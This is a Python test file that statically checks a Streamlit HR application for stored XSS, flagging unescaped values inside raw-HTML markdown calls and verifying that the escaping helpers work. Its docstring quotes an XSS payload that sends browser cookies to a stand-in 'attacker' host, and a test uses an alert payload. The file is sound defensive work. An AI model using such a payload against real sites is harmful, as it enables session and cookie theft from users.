"""
Guards against HTML injection through the Streamlit UI.

Streamlit escapes markdown by default, but ``unsafe_allow_html=True``
turns that off for the whole string. Several places interpolated stored
case data straight into such a string:

    st.markdown(f"👤 <b>{employee_name}</b> ...", unsafe_allow_html=True)

Employee names, employer names, company names and event descriptions are
all user-supplied. A case saved with the name

    <img src=x onerror="fetch('https://attacker/'+document.cookie)">

executes in the browser of every colleague who opens that list. This is
stored XSS in a multi-tenant HR product holding immigration data, so it
matters more here than the phrase "cosmetic UI layer" suggests.

The bug appeared independently in three places (sidebar, dashboard case
list, dashboard notifications) plus two more in the case timeline and rule
engine, which is why it is worth a static rule rather than another round
of manual review.

The rule: inside a raw-HTML ``st.markdown``, every interpolated value must
either be escaped at the call site or come from a helper whose own
contract is to return escaped markup.
"""

import ast
from pathlib import Path


REPOSITORY_ROOT = Path(__file__).resolve().parents[1]

UI_ROOT = REPOSITORY_ROOT / "apps"

# Callables that are contractually responsible for escaping their own
# input. Each escapes every caller-supplied value it embeds - see
# components/badges.py and components/cards.py.
TRUSTED_PRODUCERS = {
    "escape",           # html.escape, applied at the call site
    "badge_html",
    "record_row_html",
    "field_html",
}

# Locals that only ever hold markup already built by a trusted producer.
# Keeping this list explicit - rather than trusting any name ending in
# "_html" - means adding a new one is a deliberate, reviewable act.
TRUSTED_LOCALS = {
    "steps_html",       # components/workflow.py and cards.py, from escape()
    "rows_html",        # components/metrics.py, built from escape()
    "subtitle_html",    # components/layout.py, built from escape()
    "description_html", # components/layout.py, built from escape()
    "score_html",       # components/badges.py
    "rendered_value",   # components/cards.py
    "position",         # components/workflow.py, built from escape()
    "cells",
}


def _python_sources():

    for path in sorted(UI_ROOT.rglob("*.py")):
        if "__pycache__" in path.parts:
            continue
        yield path


def _is_raw_html_call(node):

    if not isinstance(node, ast.Call):
        return False

    if getattr(node.func, "attr", None) != "markdown":
        return False

    return any(
        keyword.arg == "unsafe_allow_html"
        and isinstance(keyword.value, ast.Constant)
        and keyword.value.value is True
        for keyword in node.keywords
    )


def _is_trusted(expression):
    """True if this interpolated expression cannot carry raw user input."""

    # escape(...), badge_html(...), "".join(cells) where cells is trusted
    if isinstance(expression, ast.Call):
        name = (
            getattr(expression.func, "id", None)
            or getattr(expression.func, "attr", None)
        )

        if name in TRUSTED_PRODUCERS:
            return True

        # "".join(<trusted local>) - the join itself adds nothing unsafe.
        if name == "join" and expression.args:
            return _is_trusted(expression.args[0])

        return False

    if isinstance(expression, ast.Name):
        return expression.id in TRUSTED_LOCALS

    # A literal, or an integer expression such as a loop counter.
    if isinstance(expression, ast.Constant):
        return True

    return False


def _unescaped_interpolations():

    findings = []

    for path in _python_sources():

        tree = ast.parse(path.read_text(encoding="utf-8"))

        for node in ast.walk(tree):

            if not _is_raw_html_call(node) or not node.args:
                continue

            template = node.args[0]

            if not isinstance(template, ast.JoinedStr):
                continue

            for part in template.values:

                if not isinstance(part, ast.FormattedValue):
                    continue

                if _is_trusted(part.value):
                    continue

                findings.append(
                    f"  {path.relative_to(REPOSITORY_ROOT)}:{node.lineno}"
                    f"  ->  {{{ast.unparse(part.value)}}}"
                )

    return findings


def test_no_unescaped_values_in_raw_html():

    findings = _unescaped_interpolations()

    assert not findings, (
        f"{len(findings)} value(s) interpolated into an "
        f"unsafe_allow_html=True string without escaping. Stored case data "
        f"reaching raw HTML is stored XSS - wrap the value in "
        f"html.escape(), or build the markup with one of "
        f"{sorted(TRUSTED_PRODUCERS)}:\n" + "\n".join(findings)
    )


def test_escaping_helpers_actually_escape():
    """
    The rule above trusts TRUSTED_PRODUCERS by name. This checks that
    trust is earned, so the guard cannot be satisfied by a helper that
    merely looks like it escapes.
    """

    import sys
    import types

    # The helpers are pure string functions; stub Streamlit so they can be
    # imported without a running server.
    if "streamlit" not in sys.modules:
        stub = types.ModuleType("streamlit")
        stub.markdown = lambda *args, **kwargs: None
        sys.modules["streamlit"] = stub

    from apps.web.components.badges import badge_html
    from apps.web.components.cards import field_html, record_row_html

    payload = '<img src=x onerror="alert(1)">'

    for name, markup in [
        ("badge_html", badge_html(payload, "danger", payload)),
        ("field_html", field_html(payload, payload)),
        ("record_row_html", record_row_html([payload])),
    ]:
        # What makes the payload inert is that its tag delimiters and its
        # quotes are neutralised. The substring "onerror=" may survive as
        # ordinary text - it renders as characters on screen and cannot
        # execute - so asserting on its absence would test the wrong
        # property.
        assert payload not in markup, (
            f"{name} reproduced the payload verbatim"
        )
        assert "<img" not in markup, f"{name} left an executable tag"
        assert "&lt;img" in markup, f"{name} dropped the value entirely"
        assert "&quot;" in markup, (
            f"{name} left the payload's attribute quotes unescaped"
        )
